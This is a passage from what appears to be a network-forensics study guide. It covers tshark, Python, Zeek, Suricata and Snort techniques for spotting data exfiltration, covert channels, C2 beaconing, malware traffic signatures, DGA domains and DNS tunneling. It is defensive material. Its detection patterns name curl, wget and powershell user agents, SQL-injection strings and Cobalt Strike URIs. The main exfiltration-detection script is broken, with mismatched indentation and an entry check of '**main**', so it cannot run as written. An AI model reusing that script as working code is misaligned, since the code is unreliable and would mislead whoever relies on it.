7z l -slt archive.7z | grep -i "encrypt"
```

### Exfiltration Timing Analysis

**Burst Detection:**

```bash
# Identify sudden spikes in traffic
tshark -r capture.pcap -Y "ip.src == INTERNAL_IP" \
  -T fields -e frame.time_epoch -e frame.len | \
awk '{
  second=int($1);
  bytes[second]+=$2;
}
END {
  for (s in bytes)
    if (bytes[s] > 1000000)
      print s, bytes[s], "bytes/sec"
}' | sort -k2 -rn
```

**Off-Hours Activity:**

```bash
# Weekend/night transfers
tshark -r capture.pcap -Y "tcp.len > 10000" \
  -T fields -e frame.time | \
awk '{
  day=substr($1,1,3);
  hour=substr($1,12,2);
  if (day=="Sat" || day=="Sun" || hour<6 || hour>22)
    print
}' | wc -l
```

### Comprehensive Exfiltration Detection Script

```python
#!/usr/bin/env python3
import pyshark
from collections import defaultdict
import statistics

def detect_exfiltration(pcap_file, internal_networks=['192.168.', '10.', '172.16.']):
    """Comprehensive data exfiltration detection"""
    
    # Track metrics
    uploads = defaultdict(int)
    downloads = defaultdict(int)
    dns_queries = defaultdict(int)
    dns_query_lengths = defaultdict(list)
    large_posts = []
    unusual_protocols = []
    
    print("[*] Analyzing traffic for exfiltration indicators...\n")
    
    cap = pyshark.FileCapture(pcap_file)
    
    for packet in cap:
        try:
            src_ip = packet.ip.src
            dst_ip = packet.ip.dst
            
            # Determine if source is internal
            is_internal_src = any(src_ip.startswith(net) for net in internal_networks)
            is_internal_dst = any(dst_ip.startswith(net) for net in internal_networks)
            
            # Track upload/download volumes
            if 'TCP' in packet and hasattr(packet.tcp, 'len'):
                length = int(packet.tcp.len)
                
                if is_internal_src and not is_internal_dst:
                    uploads[src_ip] += length
                elif not is_internal_src and is_internal_dst:
                    downloads[dst_ip] += length
            
            # DNS analysis
            if 'DNS' in packet and hasattr(packet.dns, 'qry_name'):
                query = packet.dns.qry_name
                if is_internal_src:
                    dns_queries[src_ip] += 1
                    dns_query_lengths[src_ip].append(len(query))
            
            # HTTP POST detection
            if 'HTTP' in packet:
                if hasattr(packet.http, 'request_method') and packet.http.request_method == 'POST':
                    if hasattr(packet.http, 'content_length'):
                        length = int(packet.http.content_length)
                        if length > 100000:  # 100KB threshold
                            large_posts.append({
                                'src': src_ip,
                                'host': packet.http.host if hasattr(packet.http, 'host') else 'unknown',
                                'size': length
                            })
            
            # Unusual protocol detection
            if 'ICMP' in packet and hasattr(packet.icmp, 'data'):
                if len(packet.icmp.data) > 64:  # Standard ping is 64 bytes
                    unusual_protocols.append(f"ICMP from {src_ip} with {len(packet.icmp.data)} bytes")
                    
        except AttributeError:
            continue
    
    cap.close()
    
    # Analysis and reporting
    print("=== Upload Volume Analysis ===")
    sorted_uploads = sorted(uploads.items(), key=lambda x: x[1], reverse=True)[:10]
    for ip, bytes_uploaded in sorted_uploads:
        mb = bytes_uploaded / (1024*1024)
        print(f"{ip}: {mb:.2f} MB uploaded")
        
        # Check upload/download ratio
        downloaded = downloads.get(ip, 0)
        if downloaded > 0:
            ratio = bytes_uploaded / downloaded
            if ratio > 3:
                print(f"  [ALERT] High upload ratio: {ratio:.1f}:1")
    
    print("\n=== DNS Exfiltration Analysis ===")
    for ip, query_count in sorted(dns_queries.items(), key=lambda x: x[1], reverse=True)[:10]: 
    avg_length = statistics.mean(dns_query_lengths[ip]) if dns_query_lengths[ip] else 0 
    print(f"{ip}: {query_count} queries, avg length: {avg_length:.1f}")

    if query_count > 1000:
        print(f"  [ALERT] Excessive DNS queries - potential tunneling")
    if avg_length > 40:
        print(f"  [ALERT] Long DNS queries - potential data exfiltration")

	print("\n=== Large HTTP POST Requests ===")
	for post in sorted(large_posts, key=lambda x: x['size'], reverse=True)[:10]:
	    mb = post['size'] / (1024*1024)
	    print(f"{post['src']} -> {post['host']}: {mb:.2f} MB")
	
	print("\n=== Unusual Protocol Activity ===")
	for activity in unusual_protocols[:10]:
	    print(f"[WARNING] {activity}")
	
	# Summary
	print("\n=== Summary ===")
	total_internal_ips = len(uploads)
	high_upload_ips = sum(1 for bytes_up in uploads.values() if bytes_up > 10*1024*1024)
	print(f"Total internal IPs with uploads: {total_internal_ips}")
	print(f"IPs with >10MB uploads: {high_upload_ips}")
	
	if high_upload_ips > 0:
	    print("\n[ALERT] Potential data exfiltration detected!")
	    print("Recommended actions:")
	    print("  1. Investigate high-volume uploading hosts")
	    print("  2. Review destination IPs/domains")
	    print("  3. Analyze file transfers for sensitive data")
	    print("  4. Check for authorized cloud storage usage")

if __name__ == "**main**": 
	detect_exfiltration("capture.pcap")
````

### File Type Analysis

**Identify Transferred File Types:**
```bash
# Extract files via HTTP
# File → Export Objects → HTTP

# Analyze exported files
for file in exported/*; do
    echo "=== $(basename $file) ==="
    file "$file"
    
    # Check for compression
    if file "$file" | grep -q "compressed"; then
        echo "[*] Compressed file detected"
    fi
    
    # Check for encryption indicators
    entropy=$(ent "$file" 2>/dev/null | grep "Entropy" | awk '{print $3}')
    if [ -n "$entropy" ]; then
        is_high=$(echo "$entropy > 7.5" | bc)
        if [ "$is_high" -eq 1 ]; then
            echo "[ALERT] High entropy: $entropy - possibly encrypted"
        fi
    fi
done
````

**Magic Byte Analysis:**

```bash
# Check for mismatched file extensions
for file in exported/*; do
    ext="${file##*.}"
    magic=$(xxd -p -l 4 "$file" | tr -d '\n')
    
    case "$magic" in
        "504b0304") type="ZIP" ;;
        "52617221") type="RAR" ;;
        "377abcaf") type="7Z" ;;
        "ffd8ffe0"|"ffd8ffe1") type="JPEG" ;;
        "89504e47") type="PNG" ;;
        "25504446") type="PDF" ;;
        *) type="UNKNOWN" ;;
    esac
    
    echo "$file: Extension=.$ext, ActualType=$type"
    
    if [[ "$ext" != "$type" ]] && [[ "$type" != "UNKNOWN" ]]; then
        echo "  [WARNING] Extension mismatch!"
    fi
done
```

### Lateral Movement and Exfiltration

**SMB File Transfer:**

```bash
# SMB file operations
tshark -r capture.pcap -Y "smb2.cmd == 8" \
  -T fields -e ip.src -e ip.dst -e smb2.filename

# Large SMB transfers
tshark -r capture.pcap -Y "smb2" -q -z conv,tcp | \
awk 'NR>5 {if ($4 > 10000000) print}'
```

**RDP Clipboard Transfer:**

```bash
# RDP connections
tshark -r capture.pcap -Y "tcp.port == 3389" -q -z conv,tcp

# Large data transfers over RDP may indicate clipboard exfil
```

### Covert Channel Detection

**Timing Channel Detection:**

```bash
# Inter-packet timing as covert channel
tshark -r capture.pcap -Y "ip.src == SUSPICIOUS_IP && ip.dst == C2_IP" \
  -T fields -e frame.time_epoch | \
awk 'NR>1 {
  interval=$1-prev;
  if (interval < 1) {
    # Convert interval to binary (crude method)
    if (interval < 0.5) bit="0"; else bit="1";
    printf bit;
  }
  prev=$1
}'
# [Inference] Timing channels encode data in packet timing variations
```

**IP ID Channel:**

```bash
# Data in IP ID field
tshark -r capture.pcap -Y "ip.src == SUSPICIOUS_IP" \
  -T fields -e ip.id | \
awk '{
  # Check for non-sequential IDs (potential data encoding)
  if (NR>1 && $1 != prev+1)
    print "Non-sequential ID:", $1, "Previous:", prev;
  prev=$1
}'
```

**TTL Channel:**

```bash
# Data encoded in TTL values
tshark -r capture.pcap -Y "ip.src == SUSPICIOUS_IP" \
  -T fields -e ip.ttl | sort | uniq -c

# Unusual TTL variations may encode data
```

### Database Exfiltration

**MySQL Exfiltration:**

```bash
# MySQL queries (port 3306)
tshark -r capture.pcap -Y "mysql" \
  -T fields -e mysql.query | grep -i "select"

# Large result sets
tshark -r capture.pcap -Y "tcp.srcport == 3306 && tcp.len > 1000" \
  -T fields -e ip.dst -e tcp.len | \
awk '{sum[$1]+=$2} END {for (ip in sum) print ip, sum[ip], "bytes"}'
```

**PostgreSQL Exfiltration:**

```bash
# PostgreSQL traffic (port 5432)
tshark -r capture.pcap -Y "tcp.port == 5432" -q -z conv,tcp

# Check for large downloads
```

**SQL Injection Data Exfil:**

```bash
# HTTP requests with SQL injection patterns
tshark -r capture.pcap -Y "http.request.uri contains \"union select\"" \
  -T fields -e http.request.uri

# Extract potentially exfiltrated data from responses
```

### Automated Exfiltration Detection

**Rule-Based Detection:**

```bash
#!/bin/bash
# Exfiltration detection rules

PCAP="$1"
ALERT_THRESHOLD_MB=50
DNS_QUERY_THRESHOLD=500

echo "=== Exfiltration Detection Rules ===" 
echo

# Rule 1: High upload volume
echo "[Rule 1] Checking for high upload volumes..."
tshark -r "$PCAP" -q -z conv,tcp 2>/dev/null | \
awk -v thresh=$((ALERT_THRESHOLD_MB * 1024 * 1024)) 'NR>5 {
  if ($1 ~ /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)/ && $4 > thresh)
    print "[ALERT] High upload from", $1, "to", $3, ":", $4, "bytes"
}'

# Rule 2: Excessive DNS queries
echo "[Rule 2] Checking for DNS tunneling..."
tshark -r "$PCAP" -Y "dns.flags.response == 0" \
  -T fields -e ip.src 2>/dev/null | sort | uniq -c | \
awk -v thresh="$DNS_QUERY_THRESHOLD" '$1 > thresh {
  print "[ALERT] Excessive DNS queries from", $2, ":", $1, "queries"
}'

# Rule 3: Large POST requests
echo "[Rule 3] Checking for large HTTP uploads..."
tshark -r "$PCAP" -Y "http.request.method == POST && http.content_length > 1000000" \
  -T fields -e ip.src -e http.host -e http.content_length 2>/dev/null | \
while read src host size; do
  mb=$((size / 1024 / 1024))
  echo "[ALERT] Large POST from $src to $host: ${mb}MB"
done

# Rule 4: Uncommon protocols to external IPs
echo "[Rule 4] Checking for unusual protocols..."
tshark -r "$PCAP" -Y "!(tcp.port == 80 || tcp.port == 443 || tcp.port == 53 || udp.port == 53)" \
  -T fields -e ip.src -e ip.dst -e tcp.port -e udp.port 2>/dev/null | \
awk '$1 ~ /^(10\.|192\.168\.)/ && $2 !~ /^(10\.|192\.168\.)/ {
  port = ($3 != "") ? $3 : $4;
  if (port != "")
    print "[WARNING] Unusual protocol from", $1, "to", $2, "port", port
}' | head -20

# Rule 5: Off-hours large transfers
echo "[Rule 5] Checking for off-hours activity..."
tshark -r "$PCAP" -Y "tcp.len > 10000" \
  -T fields -e frame.time -e ip.src -e tcp.len 2>/dev/null | \
awk '{
  hour=substr($1, 12, 2);
  if ((hour >= 22 || hour < 6) && $3 > 100000) {
    kb=$3/1024;
    print "[ALERT] Off-hours large transfer:", $2, "at", $1, "-", kb, "KB"
  }
}' | head -10

echo
echo "[+] Detection complete"
```

### Behavioral Anomaly Detection

**Baseline Comparison:**

```bash
# Establish baseline (normal traffic)
tshark -r baseline.pcap -Y "ip.src == 192.168.1.100" -q -z io,stat,3600 > baseline.txt

# Compare with current traffic
tshark -r current.pcap -Y "ip.src == 192.168.1.100" -q -z io,stat,3600 > current.txt

# Look for significant deviations
```

**Machine Learning Anomaly Detection:**

```python
#!/usr/bin/env python3
from sklearn.ensemble import IsolationForest
import numpy as np
import pyshark

def ml_exfil_detection(pcap_file):
    """Use Isolation Forest for anomaly detection"""
    
    features = []
    
    # Extract features from PCAP
    cap = pyshark.FileCapture(pcap_file)
    
    for packet in cap:
        try:
            if 'TCP' in packet:
                feature_vector = [
                    int(packet.tcp.len) if hasattr(packet.tcp, 'len') else 0,
                    int(packet.tcp.srcport),
                    int(packet.tcp.dstport),
                    int(packet.ip.ttl),
                ]
                features.append(feature_vector)
                
                if len(features) >= 10000:  # Limit for performance
                    break
                    
        except AttributeError:
            continue
    
    cap.close()
    
    if len(features) < 100:
        print("[ERROR] Insufficient data for ML analysis")
        return
    
    X = np.array(features)
    
    # Train Isolation Forest
    clf = IsolationForest(contamination=0.1, random_state=42)
    predictions = clf.fit_predict(X)
    
    # Find anomalies
    anomaly_indices = np.where(predictions == -1)[0]
    
    print(f"[*] Analyzed {len(features)} packets")
    print(f"[*] Detected {len(anomaly_indices)} anomalies ({len(anomaly_indices)/len(features)*100:.2f}%)")
    
    if len(anomaly_indices) > 0:
        print("\n[*] Sample anomalous packets:")
        for idx in anomaly_indices[:10]:
            print(f"    Packet {idx}: len={X[idx][0]}, src_port={X[idx][1]}, "
                  f"dst_port={X[idx][2]}, ttl={X[idx][3]}")

if __name__ == "__main__":
    ml_exfil_detection("capture.pcap")
```

### Post-Detection Actions

**Evidence Collection:**

```bash
# Extract suspicious flows
tshark -r capture.pcap -Y "ip.src == SUSPICIOUS_IP && ip.dst == EXTERNAL_IP" \
  -w evidence.pcap

# Extract file transfers
tshark -r capture.pcap -Y "tcp.stream eq SUSPICIOUS_STREAM" \
  -w exfil_stream.pcap

# Document findings
echo "Exfiltration Evidence Report" > report.txt
echo "=============================" >> report.txt
echo "Date: $(date)" >> report.txt
echo "Source IP: $SUSPICIOUS_IP" >> report.txt
echo "Destination: $EXTERNAL_IP" >> report.txt
tshark -r evidence.pcap -q -z conv,tcp >> report.txt
```

**Correlation with Other Data:**

```bash
# Check DNS history for destination
tshark -r capture.pcap -Y "dns.a == $EXTERNAL_IP" \
  -T fields -e dns.qry.name | sort -u

# Check for other connections to same destination
tshark -r capture.pcap -Y "ip.dst == $EXTERNAL_IP" \
  -T fields -e ip.src | sort -u

# Timeline of activity
tshark -r capture.pcap -Y "ip.src == $SUSPICIOUS_IP" \
  -T fields -e frame.time -e ip.dst -e tcp.dstport | \
  sort | head -50
```

### Important Related Topics

The following advanced topics build upon these malicious traffic detection techniques:

**Encrypted Traffic Analysis** - Detecting malicious activity in TLS/SSL traffic without decryption using metadata analysis (JA3/JA3S fingerprints, certificate analysis, traffic patterns)

**Advanced Persistent Threat (APT) Detection** - Long-term, sophisticated attack pattern recognition requiring correlation across multiple detection methods and extended timeframes

**Network Forensics** - Full investigative methodology combining these detection techniques with evidence preservation, chain of custody, and detailed attribution analysis

**Threat Intelligence Integration** - Incorporating external threat feeds (IP reputation, domain blacklists, known C2 signatures) into detection workflows for enhanced accuracy

---

## Malware Communication Patterns

### Command and Control (C2) Traffic Identification

**Common C2 Communication Characteristics:**

- Regular beaconing intervals
- High-entropy domain names
- Non-standard ports for common protocols
- Unusual user agents
- Encrypted traffic to suspicious destinations
- Protocol tunneling
- Domain generation algorithms (DGA)

### Beaconing Detection

**Identifying Periodic Communication:**

```bash
# Extract connection intervals using tshark
tshark -r capture.pcap -Y "ip.src == 192.168.1.100" \
  -T fields -e frame.time_epoch -e ip.dst | \
  awk '{print $1, $2}' | sort > connection_times.txt

# Calculate time deltas between connections
awk 'NR>1{print $2, $1-prev, $3} {prev=$1}' connection_times.txt
```

**Python Beaconing Analysis:**

```python
#!/usr/bin/env python3
from scapy.all import rdpcap
import statistics
from collections import defaultdict

def detect_beaconing(pcap_file, threshold=0.9):
    """
    Detect beaconing based on timing regularity
    threshold: coefficient of variation threshold (lower = more regular)
    """
    packets = rdpcap(pcap_file)
    
    # Group connections by source-destination pair
    connections = defaultdict(list)
    
    for pkt in packets:
        if pkt.haslayer('IP'):
            src = pkt['IP'].src
            dst = pkt['IP'].dst
            timestamp = float(pkt.time)
            connections[(src, dst)].append(timestamp)
    
    # Analyze timing intervals
    beaconing_hosts = []
    
    for (src, dst), times in connections.items():
        if len(times) < 10:  # Need sufficient samples
            continue
        
        times.sort()
        intervals = [times[i+1] - times[i] for i in range(len(times)-1)]
        
        if len(intervals) < 2:
            continue
        
        mean_interval = statistics.mean(intervals)
        stdev_interval = statistics.stdev(intervals)
        
        # Coefficient of variation
        cv = stdev_interval / mean_interval if mean_interval > 0 else 0
        
        if cv < threshold:
            beaconing_hosts.append({
                'src': src,
                'dst': dst,
                'count': len(times),
                'mean_interval': mean_interval,
                'cv': cv
            })
    
    return beaconing_hosts

# Usage
beacons = detect_beaconing('capture.pcap')
for beacon in beacons:
    print(f"[!] Potential beacon: {beacon['src']} -> {beacon['dst']}")
    print(f"    Interval: {beacon['mean_interval']:.2f}s, CV: {beacon['cv']:.3f}")
```

**Using Zeek (Bro) for Beaconing Detection:**

```bash
# Install zeek
apt-get install zeek

# Run zeek on pcap
zeek -r capture.pcap

# Analyze conn.log for beaconing
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration | \
  awk '{if($4>0) print}' | sort | uniq -c | sort -rn
```

**Frequency Analysis with tshark:**

```bash
# Count connections per minute
tshark -r capture.pcap -Y "ip.src == 192.168.1.100" \
  -T fields -e frame.time_relative -e ip.dst | \
  awk '{print int($1/60), $2}' | sort | uniq -c

# Visualize connection frequency
tshark -r capture.pcap -T fields -e frame.time_epoch -e ip.src -e ip.dst | \
  awk '{bucket=int($1/60); print bucket, $2, $3}' | \
  sort | uniq -c > frequency.txt
```

### Data Exfiltration Detection

**Large Upload Detection:**

```bash
# Find large outbound transfers
tshark -r capture.pcap -Y "ip.src == 192.168.1.0/24" \
  -T fields -e ip.src -e ip.dst -e ip.len | \
  awk '{bytes[$1" "$2]+=$3} END {for(pair in bytes) print pair, bytes[pair]}' | \
  sort -k3 -rn | head -20

# Calculate upload/download ratio
tshark -r capture.pcap -qz conv,ip
```

**DNS Tunneling Detection:**

```bash
# Detect unusually long DNS queries (potential tunneling)
tshark -r capture.pcap -Y "dns.qry.name" \
  -T fields -e dns.qry.name | \
  awk '{if(length($0)>50) print length($0), $0}' | sort -rn

# High volume of DNS queries to single domain
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20

# Detect TXT record queries (often used for tunneling)
tshark -r capture.pcap -Y "dns.qry.type == 16" \
  -T fields -e dns.qry.name -e dns.txt
```

**Unusual Port Usage:**

```bash
# Find non-standard port usage
tshark -r capture.pcap -Y "tcp" \
  -T fields -e tcp.dstport | sort | uniq -c | sort -rn

# HTTP on non-standard ports
tshark -r capture.pcap -Y "http && tcp.port != 80 && tcp.port != 8080" \
  -T fields -e ip.src -e ip.dst -e tcp.dstport -e http.host
```

### Encrypted C2 Detection

**TLS Certificate Anomalies:**

```bash
# Self-signed certificates
tshark -r capture.pcap -Y "tls.handshake.certificate" \
  -T fields -e x509sat.uTF8String | \
  grep -i "self"

# Short-lived certificates
tshark -r capture.pcap -Y "tls.handshake.certificate" -V | \
  grep -E "(notBefore|notAfter)"

# Unusual certificate subjects
tshark -r capture.pcap -Y "tls.handshake.certificate" \
  -T fields -e x509ce.dNSName -e x509sat.uTF8String
```

**JA3 Hash Analysis:**

```bash
# Extract JA3 fingerprints
tshark -r capture.pcap -Y "tls.handshake.type == 1" \
  -T fields -e tls.handshake.ja3

# Compare against known malware JA3 hashes
# [Unverified] Requires maintained database of malicious JA3 hashes
```

### Protocol Analysis

**HTTP C2 Patterns:**

```bash
# Detect HTTP POST to suspicious paths
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e ip.src -e http.host -e http.request.uri

# Unusual User-Agent strings
tshark -r capture.pcap -Y "http.user_agent" \
  -T fields -e http.user_agent | sort | uniq -c

# Base64 encoded data in HTTP
tshark -r capture.pcap -Y "http" \
  -T fields -e http.file_data | \
  grep -E "^[A-Za-z0-9+/]{40,}={0,2}$"

# Short HTTP responses (potential commands)
tshark -r capture.pcap -Y "http.response && http.content_length < 100" \
  -T fields -e ip.dst -e http.content_length -e http.file_data
```

**ICMP Tunneling Detection:**

```bash
# Detect ICMP with unusual payload sizes
tshark -r capture.pcap -Y "icmp" \
  -T fields -e ip.src -e ip.dst -e icmp.type -e data.len | \
  awk '$4 > 64 {print}'

# ICMP packets with non-standard data patterns
tshark -r capture.pcap -Y "icmp" \
  -T fields -e data.data | \
  grep -v "^[0-9a-f]\{16\}$"
```

### Network IOC Extraction

**Extract All Contacted IPs:**

```bash
# Unique destination IPs
tshark -r capture.pcap -T fields -e ip.dst | \
  sort -u > contacted_ips.txt

# Check against threat intelligence
while read ip; do
  curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=$ip" \
    -H "Key: YOUR_API_KEY" | jq .
done < contacted_ips.txt
```

**Extract All Domains:**

```bash
# DNS queries
tshark -r capture.pcap -Y "dns.qry.name" \
  -T fields -e dns.qry.name | sort -u > domains.txt

# SNI from TLS
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" \
  -T fields -e tls.handshake.extensions_server_name | sort -u >> domains.txt

# HTTP Host headers
tshark -r capture.pcap -Y "http.host" \
  -T fields -e http.host | sort -u >> domains.txt

# Remove duplicates
sort -u domains.txt -o domains.txt
```

**Extract Executables/Payloads:**

```bash
# Export all HTTP objects
tshark -r capture.pcap --export-objects http,./http_objects/

# Find PE files (Windows executables)
find ./http_objects/ -type f -exec file {} \; | grep "PE32"

# Find ELF binaries
find ./http_objects/ -type f -exec file {} \; | grep "ELF"

# Calculate file hashes
find ./http_objects/ -type f -exec sha256sum {} \;
```

### Malware Family Identification

**Common Malware Network Signatures:**

**Cobalt Strike Beacon:**

```bash
# Default Cobalt Strike characteristics
tshark -r capture.pcap -Y "http" \
  -T fields -e http.user_agent | grep -i "Internet Explorer"

# Check for common CS URI patterns
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e http.request.uri | grep -E "/__utm\.gif|/pixel\.gif|/g\.pixel"

# POST requests to suspicious paths
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.request.uri | grep -E "/submit\.php|/load"
```

**Emotet Traffic Patterns:**

```bash
# POST requests with specific patterns
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e ip.dst -e http.host -e http.request.uri

# Check for random-looking URI paths
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e http.request.uri | grep -E "/[A-Za-z0-9]{20,}/"
```

**Trickbot Detection:**

```bash
# HTTPS to numbered server tags
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" \
  -T fields -e tls.handshake.extensions_server_name | \
  grep -E "^[0-9]+\."

# Distinctive POST patterns
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.request.uri | grep -E "/(90|81|83)/"
```

### Automated Malware Traffic Analysis

**Using Suricata IDS:**

```bash
# Install suricata
apt-get install suricata

# Update rules
suricata-update

# Run on pcap
suricata -r capture.pcap -l ./logs/

# Review alerts
cat logs/fast.log
cat logs/eve.json | jq 'select(.event_type=="alert")'
```

**Using Snort:**

```bash
# Install snort
apt-get install snort

# Run on pcap
snort -r capture.pcap -c /etc/snort/snort.conf -A fast

# Review alerts
cat /var/log/snort/alert
```

**Python Malware Traffic Analyzer:**

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import defaultdict
import re

class MalwareTrafficAnalyzer:
    def __init__(self, pcap_file):
        self.pcap = rdpcap(pcap_file)
        self.suspicious_indicators = []
    
    def analyze(self):
        """Run all detection methods"""
        self.detect_high_entropy_domains()
        self.detect_suspicious_user_agents()
        self.detect_non_standard_ports()
        self.detect_large_uploads()
        return self.suspicious_indicators
    
    def detect_high_entropy_domains(self):
        """Detect DGA domains using entropy"""
        import math
        
        def calculate_entropy(string):
            if not string:
                return 0
            entropy = 0
            for x in set(string):
                p_x = string.count(x) / len(string)
                entropy += -p_x * math.log2(p_x)
            return entropy
        
        for pkt in self.pcap:
            if pkt.haslayer('DNS') and pkt.getlayer('DNS').qd:
                qname = pkt.getlayer('DNS').qd.qname.decode('utf-8', errors='ignore')
                domain = qname.split('.')[0]
                
                if len(domain) > 10:
                    entropy = calculate_entropy(domain)
                    if entropy > 3.5:  # High entropy threshold
                        self.suspicious_indicators.append({
                            'type': 'High Entropy Domain',
                            'domain': qname,
                            'entropy': entropy
                        })
    
    def detect_suspicious_user_agents(self):
        """Detect unusual user agents"""
        suspicious_ua_patterns = [
            r'python',
            r'curl',
            r'wget',
            r'powershell',
            r'^Mozilla/4\.0$',  # Very old UA
            r'bot',
            r'crawler'
        ]
        
        for pkt in self.pcap:
            if pkt.haslayer('HTTP'):
                http_layer = pkt.getlayer('HTTP')
                if http_layer.haslayer('HTTPRequest'):
                    ua = http_layer.User_Agent.decode() if hasattr(http_layer, 'User_Agent') else ''
                    
                    for pattern in suspicious_ua_patterns:
                        if re.search(pattern, ua, re.IGNORECASE):
                            self.suspicious_indicators.append({
                                'type': 'Suspicious User Agent',
                                'user_agent': ua,
                                'src_ip': pkt['IP'].src
                            })
    
    def detect_non_standard_ports(self):
        """Detect HTTP/HTTPS on non-standard ports"""
        for pkt in self.pcap:
            if pkt.haslayer('TCP'):
                dport = pkt['TCP'].dport
                
                # HTTP on non-standard port
                if pkt.haslayer('HTTP') and dport not in [80, 8080, 8000]:
                    self.suspicious_indicators.append({
                        'type': 'HTTP on Non-Standard Port',
                        'port': dport,
                        'src_ip': pkt['IP'].src,
                        'dst_ip': pkt['IP'].dst
                    })
    
    def detect_large_uploads(self):
        """Detect large outbound data transfers"""
        upload_sizes = defaultdict(int)
        
        for pkt in self.pcap:
            if pkt.haslayer('IP') and pkt.haslayer('Raw'):
                src = pkt['IP'].src
                dst = pkt['IP'].dst
                size = len(pkt['Raw'].load)
                
                # Assuming internal network is 192.168.x.x
                if src.startswith('192.168.'):
                    upload_sizes[(src, dst)] += size
        
        # Flag uploads > 10MB
        for (src, dst), size in upload_sizes.items():
            if size > 10 * 1024 * 1024:
                self.suspicious_indicators.append({
                    'type': 'Large Upload',
                    'src_ip': src,
                    'dst_ip': dst,
                    'size_mb': size / (1024 * 1024)
                })

# Usage
analyzer = MalwareTrafficAnalyzer('capture.pcap')
indicators = analyzer.analyze()

for indicator in indicators:
    print(f"[!] {indicator['type']}")
    for key, value in indicator.items():
        if key != 'type':
            print(f"    {key}: {value}")
```

## Suspicious DNS Queries

### Domain Generation Algorithm (DGA) Detection

**Entropy-Based Detection:**

```bash
# Extract DNS queries and calculate entropy
tshark -r capture.pcap -Y "dns.qry.name" \
  -T fields -e dns.qry.name > dns_queries.txt

# Python entropy calculator
python3 << 'EOF'
import math
from collections import Counter

def calculate_entropy(string):
    if not string:
        return 0
    counter = Counter(string)
    length = len(string)
    entropy = -sum((count/length) * math.log2(count/length) 
                   for count in counter.values())
    return entropy

with open('dns_queries.txt', 'r') as f:
    for line in f:
        domain = line.strip().split('.')[0]
        if len(domain) > 8:
            entropy = calculate_entropy(domain)
            if entropy > 3.5:
                print(f"{entropy:.2f} - {line.strip()}")
EOF
```

**Character Distribution Analysis:**

```python
#!/usr/bin/env python3
import re
from collections import Counter

def analyze_domain_characteristics(domain):
    """
    Analyze domain for DGA characteristics
    """
    # Remove TLD
    domain_base = domain.split('.')[0].lower()
    
    characteristics = {}
    
    # Length
    characteristics['length'] = len(domain_base)
    
    # Consonant/vowel ratio
    vowels = sum(1 for c in domain_base if c in 'aeiou')
    consonants = sum(1 for c in domain_base if c.isalpha() and c not in 'aeiou')
    characteristics['vowel_ratio'] = vowels / len(domain_base) if len(domain_base) > 0 else 0
    
    # Digit presence
    characteristics['has_digits'] = bool(re.search(r'\d', domain_base))
    characteristics['digit_ratio'] = sum(1 for c in domain_base if c.isdigit()) / len(domain_base) if len(domain_base) > 0 else 0
    
    # Consecutive consonants
    max_consecutive = 0
    current_consecutive = 0
    for c in domain_base:
        if c.isalpha() and c not in 'aeiou':
            current_consecutive += 1
            max_consecutive = max(max_consecutive, current_consecutive)
        else:
            current_consecutive = 0
    characteristics['max_consecutive_consonants'] = max_consecutive
    
    # Dictionary word check (simplified - use proper word list in production)
    common_words = ['google', 'facebook', 'amazon', 'microsoft', 'apple', 'twitter']
    characteristics['is_common_word'] = domain_base in common_words
    
    # DGA score (higher = more likely DGA)
    dga_score = 0
    if characteristics['length'] > 15:
        dga_score += 2
    if characteristics['vowel_ratio'] < 0.2 or characteristics['vowel_ratio'] > 0.6:
        dga_score += 1
    if characteristics['max_consecutive_consonants'] > 4:
        dga_score += 2
    if characteristics['has_digits']:
        dga_score += 1
    if characteristics['digit_ratio'] > 0.3:
        dga_score += 2
    
    characteristics['dga_score'] = dga_score
    
    return characteristics

# Usage
import sys
with open('dns_queries.txt', 'r') as f:
    for line in f:
        domain = line.strip()
        if domain:
            char = analyze_domain_characteristics(domain)
            if char['dga_score'] >= 4:
                print(f"[!] Suspicious: {domain} (Score: {char['dga_score']})")
```

**N-gram Analysis:**

```python
def calculate_ngram_score(domain, n=2):
    """
    Calculate how unusual domain is based on n-gram frequency
    [Inference] Requires pre-built n-gram frequency model from legitimate domains
    """
    from collections import defaultdict
    
    # Simplified example - would need training data in production
    common_bigrams = {
        'co': 0.05, 'on': 0.04, 'an': 0.04, 'en': 0.03,
        'er': 0.03, 'th': 0.03, 'in': 0.03, 'at': 0.02
    }
    
    domain_base = domain.split('.')[0].lower()
    ngrams = [domain_base[i:i+n] for i in range(len(domain_base)-n+1)]
    
    score = 0
    for ngram in ngrams:
        if ngram in common_bigrams:
            score += common_bigrams[ngram]
        else:
            score += 0.001  # Penalty for uncommon n-gram
    
    return score / len(ngrams) if ngrams else 0
```

### DNS Tunneling Detection

**Query Volume Analysis:**

```bash
# Count DNS queries per source IP
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e ip.src -e dns.qry.name | \
  awk '{count[$1]++} END {for(ip in count) print ip, count[ip]}' | \
  sort -k2 -rn

# Queries per domain
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name | \
  awk '{count[$1]++} END {for(d in count) print d, count[d]}' | \
  sort -k2 -rn | head -20
```

**Subdomain Analysis:**

```bash
# Extract long subdomains (potential data encoding)
tshark -r capture.pcap -Y "dns.qry.name" \
  -T fields -e dns.qry.name | \
  awk -F. '{if(length($1)>30) print length($1), $0}' | \
  sort -rn

# Detect excessive subdomain queries to same domain
tshark -r capture.pcap -Y "dns.qry.name" \
  -T fields -e dns.qry.name | \
  awk -F. '{domain=$(NF-1)"."$NF; count[domain]++} END {for(d in count) if(count[d]>50) print d, count[d]}' | \
  sort -k2 -rn
```

**TXT Record Analysis:**

```bash
# Extract TXT record queries and responses
tshark -r capture.pcap -Y "dns.qry.type == 16" \
  -T fields -e dns.qry.name -e dns.txt

# Detect large TXT responses
tshark -r capture.pcap -Y "dns.txt" \
